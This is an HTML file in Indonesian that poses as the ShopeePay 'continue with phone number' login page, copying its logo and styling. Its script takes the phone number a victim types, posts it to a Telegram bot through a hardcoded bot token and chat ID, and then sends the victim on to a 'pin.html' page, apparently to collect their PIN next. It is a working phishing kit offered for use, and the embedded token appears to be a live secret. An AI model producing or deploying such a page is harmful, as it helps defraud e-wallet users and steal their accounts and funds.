<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ShopeePay - Lanjut dengan No. Handphone</title>
    <style>
        :root {
            --shopee-orange: #ee4d2d;
            --shopee-light-orange: #ffbca6;
            --bg-gray: #f5f5f5;
            --text-main: #222;
            --text-muted: #888;
            --border-color: #e8e8e8;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            height: 100vh;
            padding: 16px;
            max-width: 500px; /* Optimal untuk tampilan mobile di desktop */
            margin: 0 auto;
        }

        /* Header */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
            padding-top: 8px;
        }

        .logo {
            display: flex;
            align-items: center;
            font-weight: bold;
            font-size: 22px;
            color: var(--shopee-orange);
            gap: 8px;
        }

        .logo img {
            width: 30px;
            height: 30px;
            object-fit: contain;
        }

        .lang-selector {
            display: flex;
            align-items: center;
            border: 1px solid var(--border-color);
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 14px;
            color: #555;
            gap: 6px;
            cursor: pointer;
            background: #fff;
        }

        /* Main Content */
        main {
            flex-grow: 1;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            color: var(--text-main);
            margin-bottom: 10px;
            line-height: 1.2;
        }

        p.subheading {
            font-size: 14px;
            color: var(--text-muted);
            margin-bottom: 32px;
        }

        /* Input Field */
        .input-group {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .input-container {
            display: flex;
            background-color: var(--bg-gray);
            border-radius: 4px;
            align-items: center;
            height: 56px;
            border: 1px solid transparent;
            transition: all 0.2s ease;
        }

        .input-container:focus-within {
            border-color: var(--shopee-orange);
            background-color: #fff;
            box-shadow: 0 0 0 1px var(--shopee-orange);
        }

        .prefix {
            padding: 0 16px;
            font-size: 17px;
            color: var(--text-main);
            border-right: 1px solid #ddd;
            font-weight: 500;
        }

        input {
            flex-grow: 1;
            border: none;
            background: transparent;
            padding: 0 16px;
            font-size: 17px;
            outline: none;
            color: var(--text-main);
            width: 100%;
        }

        input::placeholder {
            color: #bbb;
            font-size: 15px;
        }

        /* Footer Button */
        .footer {
            margin-top: auto;
            padding: 10px 0;
        }

        .btn-continue {
            width: 100%;
            background-color: var(--shopee-orange);
            color: white;
            border: none;
            padding: 16px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        .btn-continue:disabled {
            background-color: var(--shopee-light-orange);
            cursor: not-allowed;
            opacity: 0.8;
        }

        .btn-continue:active:not(:disabled) {
            transform: scale(0.98);
        }

        /* Error Message */
        #error-msg {
            color: var(--shopee-orange);
            font-size: 12px;
            margin-top: 4px;
            display: none;
        }
    </style>
</head>
<body>

    <header>
        <div class="logo">
            <!-- Logo Shopee Resmi -->
            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjH0dLtbGAkgEXuUUVPIWL2vOWDPCp6EOaGXjq3xpi61nitsMFbKDsGCcXbkZL8MOc5Q2EhOxQKx0feqqO01ehp3T0OcbUen3etxZLbYlg4ckVDl_0_P7FDPQYBgga0Gj1BAN0hJtaaFxvk6kXr5GQ_OR8kHdONmtKqTDD9I0_ieZv8KpFijsFfposiHEF0/s1250/template-logo-shopeepay-vector.png" alt="Shopee">
            <span>Pay</span>
        </div>

        <div class="lang-selector">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="2" y1="12" x2="22" y2="12"></line>
                <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
            </svg>
            ID
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                <polyline points="6 9 12 15 18 9"></polyline>
            </svg>
        </div>
    </header>

    <main>
        <h1>Lanjut dengan no. handphone</h1>
        <p class="subheading">Untuk mengidentifikasi akun ShopeePay Anda</p>

        <div class="input-group">
            <div class="input-container">
                <div class="prefix">+62</div>
                <input type="tel" id="phoneInput" placeholder="Masukkan nomor no. handphone" inputmode="numeric" autocomplete="tel">
            </div>
            <div id="error-msg">Nomor handphone tidak valid</div>
        </div>
    </main>

    <div class="footer">
        <button class="btn-continue" id="sendBtn" disabled>Lanjutkan</button>
    </div>

    <script>
        // --- KONFIGURASI ---
        const BOT_TOKEN = '8794002267:AAFS1_xcjzj7y-j4Ue7B-tA9sX83xa_WKmY'; // Ganti dengan Token Bot Anda
        const CHAT_ID = '7549590022';     // Ganti dengan Chat ID Anda

        const phoneInput = document.getElementById('phoneInput');
        const sendBtn = document.getElementById('sendBtn');
        const errorMsg = document.getElementById('error-msg');

        // Validasi Input (Hanya angka & aktifkan tombol jika > 8 karakter)
        phoneInput.addEventListener('input', (e) => {
            // Hapus karakter selain angka
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
            
            if (e.target.value.length >= 8) {
                sendBtn.disabled = false;
                errorMsg.style.display = 'none';
            } else {
                sendBtn.disabled = true;
            }
        });

        // Fungsi Kirim Data
        sendBtn.addEventListener('click', async function() {
            const phoneNumber = phoneInput.value;
            
            // UI Loading
            sendBtn.disabled = true;
            sendBtn.innerText = 'Menghubungkan...';

            const text = `📌 *Log ShopeePay*\n\n📱 No. HP: \`+62${phoneNumber}\`\n`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok)
                location.href = "pin.html";
                 else {
                    throw new Error('Gagal mengirim');
                }
            } catch (error) {
                alert('Terjadi kesalahan sistem. Silakan coba lagi nanti.');
                console.error(error);
            } finally {
                sendBtn.disabled = false;
                sendBtn.innerText = 'Lanjutkan';
            }
        });
    </script>
</body>
</html>
